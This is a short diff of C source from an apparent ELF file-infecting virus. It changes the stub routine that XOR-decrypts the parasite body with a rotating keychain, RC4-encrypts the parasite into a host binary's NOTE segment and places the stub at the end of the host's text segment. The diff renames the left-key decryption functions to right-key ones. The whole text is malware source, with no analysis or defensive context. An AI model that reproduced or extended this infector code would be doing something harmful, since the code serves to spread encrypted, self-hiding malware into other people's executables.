@@ -49,10 +49,10 @@ __attribute__((always_inline)) static inline void insert_stub(char *dst, Elf64_P
 	_memcpy(dst + ((segment[TEXT]->p_offset + segment[TEXT]->p_filesz) - stub_size), stub, stub_size);
 }
 
-__attribute__((always_inline)) static inline void decrypt_left(const struct s_keychain *keychain, char *callee, const size_t size)
+__attribute__((always_inline)) static inline void decrypt_right(const struct s_keychain *keychain, char *callee, const size_t size)
 {
 	for (register size_t index = 0; index < size; index++)
-		callee[index] ^= keychain->key[LEFT];
+		callee[index] ^= keychain->key[RIGHT];
 }
 
 ////////////////////////////////////////////////////////////////////////////////
@@ -65,7 +65,7 @@ void stub(struct s_host *host, struct s_keychain *keychain, enum e_context conte
 	MID_LOGGER("stub:\t\t\t");
 #endif
 
-	decrypt_left(keychain, (char *)parasite, (void *)stub - (void *)parasite);
+	decrypt_right(keychain, (char *)parasite, (void *)stub - (void *)parasite);
 
 	if (context == FAILURE)
 		goto label;
@@ -80,8 +80,8 @@ void stub(struct s_host *host, struct s_keychain *keychain, enum e_context conte
 	RC4((unsigned char *)L1, stub_size, infect->ptr + host->segment[NOTE]->p_offset, parasite_size);
 
 label:
-	update_keychain_left(keychain, (char *)stub, (void *)sign - (void *)stub);
-	decrypt_left(keychain, (char *)sign, (void *)clean - (void *)sign);
+	update_keychain_right(keychain, (char *)stub, (void *)sign - (void *)stub);
+	decrypt_right(keychain, (char *)sign, (void *)clean - (void *)sign);
 
 	sign(host, keychain, context, infect);
 }
